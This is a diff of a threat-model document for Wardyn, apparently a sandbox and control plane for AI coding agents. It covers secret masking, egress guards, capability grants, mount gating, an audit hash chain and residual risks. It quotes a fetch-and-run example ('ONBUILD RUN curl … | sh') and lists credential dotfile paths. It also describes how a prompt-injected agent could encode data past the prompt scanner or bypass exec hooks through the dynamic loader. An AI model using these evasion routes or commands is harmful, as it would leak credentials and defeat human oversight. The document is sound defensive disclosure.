+raw bytes (`JSONEscapedVariants`), covering multi-line keys and
+quote/backslash-bearing values; a secret SPLIT across two output events by the
+recorder's PTY read boundaries stays a residual the verbatim match cannot close,
+since the `"],[t,"o","` framing interrupts the byte run. The live-attach path
+masks raw PTY bytes and is unaffected.
+
+**Two named unmasked paths.**
+
+- The optional `WARDYN_RECORDING_MOUNT`/`-out-dir` single-host recording
+  fallback bypasses the control plane and delivers UNMASKED casts (masking is
+  structurally control-plane-side — `wardyn-rec` holds no secret values). Do not
+  use it where recordings are viewer-exposed.
+- **The registry is process-local and fails OPEN.** `secretmask.Registry` is an
+  in-memory map, never persisted, populated on whichever wardynd process served
+  the run's injection/mint request; the cast upload and the live-attach relay are
+  separate requests, and both fall back to unmasked pass-through when the run's
+  snapshot is empty (`buildMaskingBody`, `liveMaskWriter`). One process, one
+  replica — the shipped topology — makes the CROSS-REPLICA form inert, which is
+  why `replicas: 1` is a SAFETY control: the Helm chart refuses more
+  (`deploy/helm/wardyn/templates/deployment.yaml`) and compose's `container_name`
+  rejects `--scale`. Run a second replica anyway and a cast landing on the wrong
+  pod is persisted verbatim, live credentials in cleartext, with a `success`
+  audit event. **The single-process case is not inert**: a `wardynd` restart
+  (upgrade, crash) mid-run empties the same map, so a run whose secrets
+  registered pre-restart and whose cast uploads post-restart hits the identical
+  empty-snapshot fail-open at `replicas: 1`.
+
+### 4.2 The unconditional IP guard, and its one admin-authored exception
+
+A literal-IP target is denied before policy or approval run (`evaluate` step 0,
+`internal/egress/proxy/proxy.go`), and every direct-dialed hostname is re-vetted
+post-DNS-resolution (`VetHost`/`isBlockedIP`, `internal/egress/proxy/policy.go`)
+against loopback/link-local/multicast/unspecified, RFC1918/ULA/reserved and
+NAT64-embedded-v4 ranges. That re-check runs AFTER, and is unaffected by, the
+policy verdict — a host `allow_all_egress` would pass is still denied when it
+resolves into one of those ranges. The guard lives in the proxy's code, not the
+network topology, so unlike L0 it does not depend on gatewaylessness.
+
+**The one admin-authored exception** is `SiteConfig.InternalHosts`
+(`vetHostLift`/`Proxy.vetHost`): it lifts the RFC1918/ULA/CGNAT slice ONLY —
+never loopback/link-local/metadata/multicast/NAT64 — for a declared hostname,
+scoped to declared CIDRs, and never for an address on the proxy's own interface
+subnets or its resolved control-plane host. On Docker that excludes the
+`wardyn-internal` neighbours (Postgres/Dex/registry); on Kubernetes those are
+ClusterIP Services off the pod's own interface, so there the declared `cidrs` are
+the bound (`docs/OPERATIONS.md` § Internal hosts). The metadata address stays
+unreachable regardless of what an operator declares.
+
+The internal model gateway (residual #29) is NOT a second exception: its relaxed
+per-request vet (`Proxy.vetTrustedHost`, reached only via `Proxy.gatewayTarget`)
+is scoped to the brokered `/wardyn/llm/*` route, never an ordinary sandbox
+CONNECT/MITM naming the gateway host, which `Proxy.vetHost` covers unchanged.
+The one hop that defers the post-resolution re-check — the opt-in upstream
+corp-proxy lane — is §5.1a's disclosed TOCTOU residual; step 0 still holds there.
+
+### 4.3 Capability grants (v0.6) — the mechanism
+
+Four closed kinds: `egress_host`, `secret` and `workspace` NARROW what a member
+could already do; `image` WIDENS — without both its switch on and an exact-ref
+grant a member cannot name a custom image at all. `devcontainer_repo` is
+deliberately not a kind and stays unconditionally admin-only: it executes
+attacker-authored build configuration, not a power to hand out one row at a time.
+
+One resolver answers both directions (`capAllowed`/`capGranted`,
+`internal/api/capabilities.go`) on a fixed precedence: admins, the admin token
+and local mode are EXEMPT (a capability bounds the tier below the one writing the
+grants); then any matching **deny**; then any matching **allow**; then the
+per-kind enforcement switch; and a store error answers `500` rather than reading
+as permission. Deny sits ABOVE the switch so one host can be blacklisted for one
+contractor without taking the deployment fail-closed, and there is no
+user-over-group precedence (a user allow overriding a group deny is a breach
+report, not a feature). `egress_host` values match via `entryCoversAny` — the
+SAME matcher the egress substitution drop uses, never a second one that could
+disagree about a port suffix — and deny rows match on overlap in either
+direction, so a narrower request cannot slip under a broader deny nor a broader
+one over a narrower deny; every other kind is an exact compare, and grant values
+are shape-validated at the write boundary.
+
+Enforcement seams: `narrowMemberInlinePolicy` (a member's own `inline_policy`
+allowlist and secret refs), `denyMemberRequest` (`workspace_id`, `image`,
+`devcontainer_repo`), `authorizeMemberDecision` (which host a member may decide
+an `egress_domain` approval for) and `handleListSecrets` (which names `GET /secrets`
+lists back).
+
+**The doctrine is the security-relevant half: a capability never narrows what the
+ADMIN pre-authorized** — a stored policy, a workspace's own requirements,
+scan-seeded hosts and the model provider's own egress stay untouched, because
+narrowing them would brick workspace runs at scale. Grant CRUD and the switch map
+are `operatorOnly` and audited (`capability.grant.created`/`.updated`/`.deleted`,
+`capability.enforcement.write`); every member refusal that is not a plain
+foreign-resource 404 audits as `authz.denied` with a `reason` from a closed
+vocabulary (`capability_workspace`, `capability_egress_host`, `capability_secret`,
+`byoi_member`, `grant_pairing_not_eligible`). **EVERY switch ships OFF** — an
+absent `capability_enforcement` row is not enforced — so a 0.5 deployment upgraded
+with no rows behaves byte-for-byte as it did. Fail-open BY DESIGN, chosen for
+adoption over posture; residual #20 states the cost.
+
+### 4.4 Member-authored host mounts (v0.6) — the gate
+
+`composer.Clamp` still drops every composer-proposed and inline-policy mount
+unconditionally, so a member-owned workspace is the only path on which a
+non-operator supplies a host bind source. The gate is additive: the operator
+deny-list (`ValidateMountSource`) runs first and unchanged; then the source's
+**canonicalized real path** (`filepath.EvalSymlinks`, fail-CLOSED on any resolve
+error — no lexical fallback) must sit inside an operator/MDM-set root
+(`WARDYN_MEMBER_WORKSPACE_ROOTS`, or that principal's `_MAP` entry, which
+REPLACES the shared list); and it must neither BE nor TRAVERSE a credential
+dotfile path (`.ssh`, `.aws`, `.claude`, `.wardyn`, `.gnupg`, `.docker`, `.kube`,
+`.config/gh`, `.netrc`, `.git-credentials`, `.git/config`).
+
+Unset roots = **no member host mounts at all**. Writability is a SECOND, narrower
+allowlist (`WARDYN_MEMBER_WRITABLE_ROOTS` minus `WARDYN_MEMBER_WRITABLE_DENY`,
+deny first and winning); both unset = every member mount read-only. Because the
+within-root test runs on the RESOLVED path, a symlink inside a root aimed out of
+every root is refused — the escape a lexical prefix check misses — and because the
+deny-list matches the resolved path too, a root set carelessly at `$HOME` still
+cannot hand a member their own `~/.ssh`.
+
+The check runs at onboarding, again at run-create, and a THIRD time in the docker
+driver immediately before `ContainerCreate` (`agentMounts`, on
+`Mount.MemberAuthored` only), which makes a source repointed between onboarding
+and launch fail closed. Gating on `MemberAuthored` rather than "this is a member
+run" is load-bearing: the operator's staged `~/.claude` and Bedrock `~/.aws` binds
+ride the same spec and live outside every member root by construction. An operator
+run carries no roots and takes exactly the pre-0.6 path.
+
+### 4.5 The audit hash chain — what it is and is not
+
+Append-only triggers bind nobody who can `ALTER TABLE ... DISABLE TRIGGER`: a
+table OWNER or superuser can rewrite an `audit_events` row, which
+`0007_audit_least_privilege.sql` already publishes as a residual. Migration
+`0047_audit_hash_chain.sql` does not close that — it makes ONE use of it
+detectable. Every post-migration row carries
+`row_hash = SHA-256(prev_hash || canonical(id, time, run_id, actor_type, actor,
+action, target, outcome, source_ip, data))`, computed **inside Postgres** in a
+`BEFORE INSERT` trigger, so the writer cannot choose it and both in-tree insert
+paths (the store and the broker's in-tx `credential.mint`) inherit the chain.
+Editing one row breaks its own hash; deleting one breaks its neighbours' link; the
+operator-invoked sweep (`GET /api/v1/audit/chain/verify`, admin-only, never run at
+boot) names the first broken `seq` and why.
+
+**WHAT IT IS NOT: tamper-EVIDENCE, not tamper-proofness.** An actor who can
+rewrite one row can usually rewrite every row after it and re-chain the tail, and
+a re-chained tail verifies perfectly clean; truncating the newest rows leaves a
+shorter, valid chain and is likewise invisible to the chain alone. The control
+against both is OFF-BOX and a separate promise: the audit-sink stream carries each
+row's `prev_hash`/`row_hash`, so a SIEM holds head hashes, and a chain no longer
+containing a recorded head has been rewritten or truncated. Pre-migration rows
+keep NULL hashes and sit outside the chain (no backfill — hashes computed after
+the fact by the process that could have altered the rows prove nothing). Signed
+receipts under a key no database role can reach are the next rung and are **NOT
+built**.
 
 ---
 
@@ -243,661 +398,470 @@ the canary, never merely claimed because a policy object was applied.
 These risks are **not closed by v1 Wardyn**. We publish them verbatim because
 hiding them would repeat the failure mode we are designed to avoid.
 
-1. **The model-API channel is an unavoidable data-exit path.** Per Anthropic
-   documentation, the LLM gateway logs every prompt/token/tool call but cannot
-   prevent an agent from encoding data into a prompt to a model it is permitted
-   to call. Any marketing must not claim exfil-proof. An OPTIONAL, off-by-default
-   *content-inspection guardrail* (`internal/contentscan`, policy `llm_inspection`)
-   now NARROWS this residual for the HONEST-agent case — it scans outbound prompts
+1. **The model-API channel is an unavoidable data-exit path.** The LLM gateway
+   logs every prompt/token/tool call but cannot stop an agent encoding data into a
+   prompt to a model it may call. **Marketing must not claim exfil-proof.** The
+   optional, off-by-default guardrail (`internal/contentscan`, policy
+   `llm_inspection`) narrows this for the HONEST agent — it scans outbound prompts
    on the inspectable API-key route for operator-declared known secret values and
-   can alert/block — but it does NOT close the channel: a malicious/prompt-injected
-   agent can base64/hex/split-across-turns/encrypt around any scanner (bounded
-   decode-normalization narrows, never closes this), and subscription-OAuth/Bedrock
-   CONNECT modes are opaque until the Phase-2 TLS-MITM tier (such runs are flagged
-   `llm.scan.blind`). See §5.1a for the exact claims contract.
+   can alert/block — but a prompt-injected agent can
+   base64/hex/split-across-turns/encrypt around any scanner, and
+   subscription-OAuth/Bedrock CONNECT modes stay opaque until the Phase-2 TLS-MITM
+   tier (flagged `llm.scan.blind`). §5.1a is the claims contract.
 
 2. **Domain fronting and exfil via dual-use allowlisted domains** are not closed
-   below the optional L2 TLS-intercept+DLP tier. Hostname-only egress filtering
-   (CONNECT/SNI mode) is domain-frontable. The TLS-MITM tier itself is now
-   **shipped**, off by default, opt-in per policy (`intercept_tls`) — see §5.1a
-   for the exact contract — but its coverage is bounded: only operator-listed
-   MITM-eligible hosts (LLM hosts plus any operator-configured corp artifact
-   hosts today — `isMITMHost`, `internal/egress/proxy/mitm.go`) are intercepted, the
-   full container path is not yet live-validated (proven so far by an
-   in-process test only), and per-workspace ephemeral-CA injection into
-   arbitrary agent images, plus QUIC/UDP/raw-TCP coverage, remain
-   unconfirmed/unbuilt.
+   below the optional L2 TLS-intercept+DLP tier: hostname-only filtering
+   (CONNECT/SNI) is domain-frontable. That tier is **shipped**, off by default,
+   opt-in per policy (`intercept_tls`, contract in §5.1a) — but bounded to
+   operator-listed MITM-eligible hosts (`isMITMHost`,
+   `internal/egress/proxy/mitm.go`), proven on the full container path only by a
+   Docker-gated test outside default CI (`TestLive_SubscriptionInject`), with
+   per-workspace ephemeral-CA injection into arbitrary agent images and
+   QUIC/UDP/raw-TCP coverage unconfirmed/unbuilt.
 
 3. **DNS-tunneling through the mandatory permitted resolver** is a residual
    channel below the TLS-intercept tier.
 
-4. **Kernel 0-day on CC1 hardened-runc hosts (shared kernel).** runc-as-sole-
-   boundary is explicitly insufficient for LLM-generated code; this tier alone
-   is published as the weakest. A kernel 0-day defeats the sandbox boundary. The
-   gVisor sentry 0-day / compatibility-gap class similarly applies to CC2 (e.g.,
-   the CVE-2026-22708 sandbox-escape class acknowledged).
+4. **Kernel 0-day on CC1 hardened-runc hosts (shared kernel).**
+   runc-as-sole-boundary is explicitly insufficient for LLM-generated code; this
+   tier alone is published as the weakest. A kernel 0-day defeats the sandbox
+   boundary; the gVisor sentry 0-day / compatibility-gap class applies similarly to
+   CC2 (e.g. the CVE-2026-22708 sandbox-escape class acknowledged).
 
-   **go-landlock evaluated, not adopted (2026-07-06).** A belt-and-suspenders
-   Landlock layer *underneath* CC1 was proposed and evaluated honestly against
-   how Wardyn actually launches sandboxes, then rejected for now:
-   `go-landlock`'s `landlock_restrict_self()` confines the CALLING process and
-   whatever it forks/execs afterward. wardynd never forks the agent process —
-   it talks to the Docker API (`internal/runner/docker/driver.go`), and
-   dockerd/containerd/runc fork+exec the container in a wholly separate
-   process tree. Calling go-landlock in-process in wardynd would therefore
-   confine wardynd itself, not the agent sandbox — zero value against the
-   threat this tier is published against. To confine the agent, Landlock
-   would have to be applied *inside the container* before the agent command
-   runs. But the agent command is launched via `docker exec`
-   (`internal/runner/docker/session.go`'s "docker exec hijack" path), which
-   creates a process alongside the container's PID 1 rather than a fork/exec
-   descendant of it, so restricting PID 1 (Wardyn's own idle-holder script)
-   would not reach the exec'd agent either. The only mechanism that would
-   actually work is a landlock-restricting wrapper baked into the *agent
-   image* that `docker exec` invokes in place of the real command — but
-   Wardyn does not own or control agent image content (`spec.Image` is
-   operator-supplied), so this can't be delivered as a Wardyn-side fix without
-   mandating an image convention or injecting a wrapper via bind mount, either
-   a materially bigger change than "genuinely small," not an in-process
-   library call. Landlock kernel/LSM-stack support is also host-conditional in
-   exactly the way AppArmor/SELinux already are in this codebase
-   (`hostSupportsAppArmor` / `hostSupportsSELinux`,
-   `internal/runner/docker/hardening.go`), so it would need the same
-   detect-and-gate treatment, never a blind call. Revisit if/when Wardyn ships
-   or mandates its own agent-image base — a wrapper entrypoint becomes a
-   small, honest addition at that point.
+   **go-landlock evaluated, rejected (2026-07-06).** `landlock_restrict_self()`
+   confines the calling process and its descendants, and wardynd parents neither:
+   it drives the Docker API (`internal/runner/docker/driver.go`) while
+   dockerd/containerd/runc fork the container in a separate tree, and the agent
+   command arrives via `docker exec` (`internal/runner/docker/session.go`'s "docker
+   exec hijack"), a sibling of PID 1. The only mechanism that works is a wrapper
+   baked into the *agent image*, which Wardyn does not own (`spec.Image` is
+   operator-supplied); support is host-conditional exactly as AppArmor/SELinux are
+   (`hostSupportsAppArmor`/`hostSupportsSELinux`,
+   `internal/runner/docker/hardening.go`). Revisit if Wardyn ships its own base.
 
-5. **`ld-linux`/`mmap` dynamic-linker bypass of in-guest LSM/eBPF `execve`
-   hooks (the documented egress-veto overclaim lesson).** Kernel exec-blocking is published as one
+5. **`ld-linux`/`mmap` dynamic-linker bypass of in-guest LSM/eBPF `execve` hooks
+   (the documented egress-veto overclaim lesson).** Kernel exec-blocking is one
    detection layer with a documented bypass class, never a prevention guarantee.
-   The shipped eBPF/Tetragon ground-truth stream FLAGS loader exec
-   (`kernel.process.exec` with `data.loader=true` for `ld-linux*`/`ld-musl*`) so
-   the bypass is at least *visible* in the audit trail — it does not block it.
-   Agents can also observe enforcement effects. The real boundary is structural
-   (no network path, no resident credentials outside the §5.1a exceptions)
-   enforced out-of-band.
+   The eBPF/Tetragon stream FLAGS loader exec (`kernel.process.exec`,
+   `data.loader=true` for `ld-linux*`/`ld-musl*`) so the bypass is *visible* — it
+   does not block it, and agents can observe enforcement effects. The real boundary
+   is structural (no network path, no resident credentials outside the §5.1a
+   exceptions), enforced out-of-band.
 
-6. **Host eBPF blindness to in-guest syscalls under CC3 Kata microVMs.**
-   Requires an in-guest sensor or orchestration-layer audit fallback. This is a
-   published gap; Tetragon inside the Kata guest is the mitigation path.
+6. **Host eBPF blindness to in-guest syscalls under CC3 Kata microVMs.** Requires
+   an in-guest sensor or orchestration-layer audit fallback. Published gap;
+   Tetragon inside the guest is the mitigation path.
 
 7. **The 1-hour minted-token usage window before kill-switch revocation fires.**
    Minimized via short TTL, not eliminated. A token used within its window before
    revocation reaches the upstream service.
 
-8. **Per-run SPIRE registration-entry churn at scale.** Registration-entry churn,
-   mint latency on the task-start hot path, and revocation-cascade timing
-   (sandbox + SPIRE entry + minted tokens) are unprototyped anywhere. Published
-   as an explicit engineering risk, not a solved property.
+8. **Per-run SPIRE registration-entry churn at scale.** Entry churn, mint latency
+   on the task-start hot path, and revocation-cascade timing (sandbox + SPIRE entry
+   + minted tokens) are unprototyped anywhere. An explicit engineering risk, not a
+   solved property.
 
-9. **Compromised platform operator / admin (insider-admin).** Out of scope for
-   v1 — no separation-of-duty on the control plane yet. A platform admin can
-   defeat audit integrity and policy. Signed action receipts are required to
-   raise this bar (planned for v1.0); the hash chain itself ships (migration
-   `0047`) and makes one such rewrite detectable.
+9. **Compromised platform operator / admin (insider-admin).** Out of scope for v1
+   — no separation-of-duty on the control plane yet. A platform admin can defeat
+   audit integrity and policy. Signed action receipts are required to raise this
+   bar (planned for v1.0); the hash chain ships (migration `0047`) and makes one
+   such rewrite detectable.
 
-10. **Silent degradation to danger-full-access in nested-sandbox/DinD** (the
-    Codex documented fallback): Wardyn fails closed instead, but full DinD
-    isolation depends on the opt-in Sysbox tier, which shares the host kernel.
+10. **Silent degradation to danger-full-access in nested-sandbox/DinD** (the Codex
+    documented fallback): Wardyn fails closed instead, but full DinD isolation
+    depends on the opt-in Sysbox tier, which shares the host kernel.
 
-11. **Approval-to-credential-issuance coupling correctness (B5).** This coupling
-    has no prior art. Its security rests on chain integrity against
-    delegation-chain-splicing and on a risk classifier whose accuracy is
-    unmeasured. Queue UX, blocking-latency tolerance, and classifier accuracy
-    are unvalidated at v1.
+11. **Approval-to-credential-issuance coupling correctness (B5).** No prior art.
+    Its security rests on chain integrity against delegation-chain-splicing and on
+    a risk classifier whose accuracy is unmeasured. Queue UX, blocking-latency
+    tolerance and classifier accuracy are unvalidated at v1.
 
-12. **eBPF ground-truth stream live-validated on ONE host; the sensor has
-    measured ceilings.** The stream's control-plane plumbing — ingest endpoint,
-    audience-separated write-only token, append-only recording, and the
-    `/healthz` honest-degradation gate — is shipped and unit-tested, and the
-    Tetragon→`kernel.*` mapper has now been run against a live Tetragon
-    (v1.1.2, privileged, the compose `groundtruth` profile); the measured
-    sensor ceilings — what the kprobes did and did not see — are recorded
-    where operators read them (`deploy/compose/README.md`). The
-    honest-degradation gate remains the safety net: a host without a working
-    sensor reports `ebpf_groundtruth=unavailable` and the stream never falsely
-    reads `healthy`. Broader-fleet validation is the follow-up.
+12. **eBPF ground-truth stream live-validated on ONE host; the sensor has measured
+    ceilings.** The control-plane plumbing — ingest endpoint, audience-separated
+    write-only token, append-only recording, `/healthz` honest-degradation gate —
+    is shipped and unit-tested, and the Tetragon→`kernel.*` mapper has run against
+    a live Tetragon (v1.1.2, the compose `groundtruth` profile); the measured
+    ceilings are recorded where operators read them (`deploy/compose/README.md`). A
+    host without a working sensor reports `ebpf_groundtruth=unavailable` and the
+    stream never falsely reads `healthy`. Broader-fleet validation is the follow-up.
 
-13. **A Bring-Your-Own-Image base is trusted-by-the-operator, and the wrap that
-    adds Wardyn's tools runs on the HOST — and so does the RECOMMENDED
-    devcontainer build.** `internal/envbuild` gates two distinct lanes behind
-    the single `WARDYN_ENVBUILD` flag: `FinalizeBase` (the BYOI wrap — a
-    `FROM` + `COPY` build that executes nothing the base controls) and the
-    ENVBUILDER stage (the "Recommended — built for this workspace" devcontainer
+13. **A BYOI base is trusted-by-the-operator, and the wrap that adds Wardyn's
+    tools runs on the HOST — and so does the RECOMMENDED devcontainer build.**
+    `internal/envbuild` gates two lanes behind one `WARDYN_ENVBUILD` flag:
+    `FinalizeBase` (the BYOI wrap — a `FROM` + `COPY` that executes nothing the base
+    controls) and the ENVBUILDER stage (the "Recommended — built for this workspace"
     build, which clones the source and genuinely RUNS its
-    `Dockerfile`/devcontainer features/`onCreateCommand`). Both build on the
-    host Docker daemon — outside the untrusted-build sandbox and outside every
-    confinement tier. **Default posture differs by deployment**: a bare-binary
-    or host-mode `wardynd` still defaults `WARDYN_ENVBUILD` off (opt-in); the
-    compose stack (`make setup`) defaults it ON — so on the flagship install
-    the RECOMMENDED path runs build-time code by default, not on request.
-    Wrapping is **not vetting**, and the honest boundaries are:
+    `Dockerfile`/features/`onCreateCommand`). Both run on the host Docker daemon,
+    outside the untrusted-build sandbox and outside every confinement tier.
+    **Default posture differs by deployment:** a bare-binary or host-mode `wardynd`
+    defaults `WARDYN_ENVBUILD` off; the compose stack (`make setup`) defaults it ON,
+    so on the flagship install the RECOMMENDED path runs build-time code by default.
+    Wrapping is **not vetting**:
 
-    - **Devcontainer build-time execution is real, and it is neither
-      tier-confined nor proxied.** The ENVBUILDER stage executes the source's
-      own `Dockerfile`/feature/lifecycle-command content (or, for Wardyn's own
-      generated recommended build, an installer this range added — see
-      `docs/OPERATIONS.md` "A named Anthropic integration bakes the
-      claude-code CLI") inside a build container that is capped (CapDrop ALL,
-      resource limits) but is neither a Confinement Class nor behind
-      `wardyn-proxy`. On the compose stack it reaches only the network named
-      by `WARDYN_ENVBUILD_BUILD_NETWORK` (default: the `wardyn-internal`
-      bridge the run sandboxes themselves use, never `host` — `host` would
-      additionally reach the loopback-published control-plane Postgres and
-      admin API). A repo's own devcontainer build carries this same exposure;
-      it is accepted, structural — the same trust an operator already places
-      in any build step run on their behalf — not a gap defended against
-      elsewhere in this document. See actor "Repo-supplied devcontainer/build
-      content" (§1) and boundary B8 (§3).
-    - **Wrap-only is enforced, not assumed.** A `FROM` fires any `ONBUILD`
-      triggers baked into the base, which would make a hostile base host-side
-      build-time RCE (`ONBUILD RUN curl … | sh`) — the one way a base's content
-      reaches the host *before* confinement applies. Docker exposes no flag to
-      suppress triggers, so Wardyn preflights the base (`ImageInspect`) and
-      **refuses to wrap** one declaring any (`assertWrapSafeBase`), on both the
-      BYOI and devcontainer paths. Wardyn also pulls the base itself rather than
-      leaving it to the builder's `PullParent`, so the wrap builds `FROM` the
-      exact image the preflight inspected. Residual: this closes the ONBUILD
-      class specifically. The wrap build otherwise runs with the daemon's normal
-      privileges, and a Docker/BuildKit vulnerability reachable from parsing a
-      crafted base image's metadata or layers is not defended against here.
-    - **Digest pinning is honored, NOT enforced.** A base ref may be a mutable
-      tag or a digest-pinned ref (`repo@sha256:…`). A pinned, pre-pulled base is
-      matched without a registry round-trip (works for private/air-gapped
-      images), and pinning is the recommended operator practice — but Wardyn
-      **does not require it**. A mutable tag is resolved at wrap time, so a
-      registry that re-points a tag changes what gets wrapped, and the run's
-      recorded image tag is not by itself proof of image content. Operators who
-      need that property must pass a digest.
-    - **Base CONTENT is not scanned or attested.** No malware/CVE scan, no
-      signature or provenance verification (no cosign/notation/SLSA check) is
-      performed on a BYOI base. A backdoored base is wrapped and launched.
-      What bounds this is structural rather than inspective: **a BYOI base's**
-      code only ever executes *later*, inside the run's confinement tier, under
-      the same egress policy, credential-brokering and audit as any other run
-      — so a hostile BYOI base is contained exactly as well as a hostile agent
-      is, and no better. (This does NOT extend to devcontainer build-TIME
-      content — that executes earlier, unconfined, per the bullet above.) The
-      launch gate is a functional self-test (`agent-run --selftest`), which
-      proves the image is *runnable*, never that it is *trustworthy*.
+    - **Devcontainer build-time execution is real, and neither tier-confined nor
+      proxied.** The build container is capped (CapDrop ALL, resource limits) but is
+      neither a Confinement Class nor behind `wardyn-proxy`; on compose it reaches
+      only `WARDYN_ENVBUILD_BUILD_NETWORK` (default: the `wardyn-internal` bridge,
+      never `host` — `host` would additionally reach the loopback-published
+      control-plane Postgres and admin API). Accepted and structural: the same trust
+      an operator places in any build step run on their behalf. See §1's
+      "Repo-supplied devcontainer/build content", boundary B8, and
+      `docs/OPERATIONS.md` "A named Anthropic integration bakes the claude-code CLI".
+    - **Wrap-only is enforced, not assumed** (the ONBUILD preflight + self-pull,
+      §4) — that closes the ONBUILD class only. The wrap runs with the daemon's
+      normal privileges; a Docker/BuildKit vulnerability reachable from parsing a
+      crafted base's metadata or layers is not defended against here.
+    - **Digest pinning is honored, NOT enforced.** A base ref may be a mutable tag or
+      a digest-pinned ref (`repo@sha256:…`); a pinned, pre-pulled base is matched
+      without a registry round-trip (works air-gapped) and pinning is the
+      recommended operator practice — but Wardyn **does not require it**. A mutable
+      tag is resolved at wrap time — a registry
+      re-pointing a tag changes what gets wrapped, and the run's recorded image tag
+      is not by itself proof of content.
+    - **Base CONTENT is not scanned or attested** — no malware/CVE scan, no
+      signature or provenance verification (no cosign/notation/SLSA). A backdoored
+      base is wrapped and launched. What bounds it is structural: a BYOI base's code
+      executes only *later*, inside the run's confinement tier under the same egress
+      policy, credential-brokering and audit — contained exactly as well as a hostile
+      agent, no better. (Devcontainer build-TIME content is NOT covered by that
+      argument.) The launch gate is a functional self-test (`agent-run --selftest`):
+      proves the image *runnable*, never *trustworthy*.
 
-14. **The control plane authenticates; it barely authorizes.** Distinct from
-    #9, which is about someone who already IS an admin: wherever more than one
-    human can authenticate — i.e. any OIDC deployment — every authenticated
-    developer would hold admin powers, because an unconfigured deployment
-    derives every session to the admin role.
-    That state is no longer reachable by accident: OIDC configured with an empty
-    `WARDYN_OIDC_OPERATOR_EMAILS` REFUSES TO BOOT unless
-    `WARDYN_ALLOW_OIDC_NO_OPERATOR_LIST` is set, so an operator either names the
-    operators or explicitly accepts all-admin. Setting `WARDYN_OIDC_OPERATOR_EMAILS`
-    to a list of operator addresses makes every other signed-in human a
-    **member**: 403 on the mutating routes of eight clusters — the managed
-    harness credential, policy CRUD, workspace CRUD (including the scoped
-    widening writes below), `PUT /site-config` and its two connectivity
-    probes (each launches a sandbox on the operator's behalf), secret
-    write/delete, the attach WebSocket's ticket-LESS fallback lane (`GET
-    /runs/{id}/attach` falling back to session-cookie auth when no `?ticket=`
-    is presented, since a browser attaches that cookie to a same-origin
-    handshake on its own), the source-library and base-image catalog CRUD,
-    and integration writes (`PUT`/`DELETE /integrations/{id}`). **Two acts
-    moved DOWN to owner-or-admin since
-    v0.5 and are deliberately NOT in this list**: minting an attach ticket
-    (`POST /runs/{id}/attach-ticket` — a member may still hold one for a run
-    THEY created; the WebSocket then re-checks the ticket's own stamped
-    role/principal at consume time, since the ticket-bearing lane never runs
-    this gate at all — `handleAttachWS`) and deciding an `egress_domain`
-    approval (a member may decide one raised by a run they own; `credential`
-    and `tool_call` approvals stay admin-only regardless of ownership — see
-    residual #17). Reads are never gated, the admin token and local mode are always
-    operators (one shared credential carries no human to demote), and NOTHING
-    ELSE is covered — notably `POST /runs` and `POST /runs/{id}/kill` remain
-    open to any signed-in human: launching, killing and deciding an
-    `egress_domain` approval on one's OWN run is a member act by
-    design. Leave the list unset and the paragraph below
-    is the whole truth. Policy
-    CRUD, workspace CRUD (including the scoped `approved-egress` / `llm-cred` /
-    `requirements` writes that widen what a run may do), secret write/delete,
-    `GET`/`PUT /site-config`, the managed harness credential (`POST
-    /setup/harness-login` and `PUT`/`DELETE /setup/harness-credential/{provider}`
-    — connects/disconnects the shared subscription EVERY run inherits),
-    deciding an approval, minting an attach ticket, and `POST
-    /runs/{id}/kill` all sit in one `humanOrAdminAuth` group
-    (`internal/api/server.go`, which says so at each site). So the §1 insider
-    can raise their own ceiling rather than exceed it: `PUT` a policy with a
-    wide-open allowlist, or point every run's upstream proxy at a host they
-    control (site-config names a secret ref, and `PUT /secrets/{name}` is in the
-    same group). What bounds this is the operator allowlist above where it
-    applies, and otherwise attribution rather than prevention — every such write
-    is audited (`policy.create`/`update`/`delete`,
+14. **The control plane authenticates; it barely authorizes.** Distinct from #9
+    (someone who already IS an admin): on any OIDC deployment every authenticated
+    developer would hold admin powers, because an unconfigured deployment derives
+    every session to the admin role.
+
+    Not reachable by accident: OIDC with an empty `WARDYN_OIDC_OPERATOR_EMAILS`
+    REFUSES TO BOOT unless `WARDYN_ALLOW_OIDC_NO_OPERATOR_LIST` is set. What the
+    list changes, cluster by cluster:
+
+    | Route cluster | Operator list SET | List UNSET |
+    |---|---|---|
+    | Policy CRUD; workspace CRUD incl. the scoped `approved-egress` / `llm-cred` / `requirements` widening writes; secret write/delete; `GET`/`PUT /site-config` + its two connectivity probes (each launches a sandbox on the operator's behalf); the managed harness credential (`POST /setup/harness-login`, `PUT`/`DELETE /setup/harness-credential/{provider}` — the shared subscription EVERY run inherits); source-library and base-image catalog CRUD; integration writes (`PUT`/`DELETE /integrations/{id}`); the attach WebSocket's ticket-LESS fallback lane (`GET /runs/{id}/attach` falling back to session-cookie auth when no `?ticket=` is presented) | 403 for members | any signed-in human, via the one `humanOrAdminAuth` group (`internal/api/server.go`, which says so at each site) |
+    | Minting an attach ticket (`POST /runs/{id}/attach-ticket`); deciding an `egress_domain` approval on a run one owns | owner-or-admin — **moved DOWN since v0.5, deliberately NOT in the 403 list.** The WebSocket re-checks the ticket's own stamped role/principal at consume time, since the ticket-bearing lane never runs this gate (`handleAttachWS`); `credential` and `tool_call` approvals stay admin-only regardless of ownership (residual #17) | same |
+    | `POST /runs`, `POST /runs/{id}/kill`, every read | open to any signed-in human, by design | same |
+
+    The admin token and local mode are always operators (one shared credential
+    carries no human to demote). So the §1 insider raises their own ceiling rather
+    than exceeding it: `PUT` a wide-open policy, or point every run's upstream proxy
+    at a host they control (site-config names a secret ref, and
+    `PUT /secrets/{name}` is in the same group). What bounds this is the operator
+    allowlist where it applies, otherwise attribution not prevention — every such
+    write is audited (`policy.create`/`update`/`delete`,
     `secret.write`/`secret.delete`, `site_config.write`,
-    `harness.credential.captured`/`disconnected`) and OIDC login can be narrowed
-    to a verified-email domain (`WARDYN_OIDC_EMAIL_DOMAINS`, empty = any
-    verified email). Note the allowlist matches the session's `email` claim,
-    which is only forced to be IdP-VERIFIED when `WARDYN_OIDC_EMAIL_DOMAINS` is
-    also set — set both, or trust your IdP not to emit unverified addresses. In
-    local mode and admin-token mode the only principal IS the admin, so the gap
-    collapses into #9. The fix is `ROADMAP.md`'s v1.0 "separation of duty on the
-    control plane".
+    `harness.credential.captured`/`disconnected`) — plus optional narrowing to a
+    verified-email domain (`WARDYN_OIDC_EMAIL_DOMAINS`, empty = any verified email;
+    the `email` claim it matches is only forced IdP-VERIFIED when that var is also
+    set — set both, or trust your IdP). In local and admin-token mode the only
+    principal IS the admin, so the gap collapses into #9. The fix is `ROADMAP.md`'s
+    v1.0 "separation of duty on the control plane".
 
-    **What v0.6 changed, and what it did not.** Capability grants (§4, residual
-    #20) add a *fourth* dimension to this picture, not a third role: on four
-    closed kinds an admin can now narrow one member — or one IdP group, or every
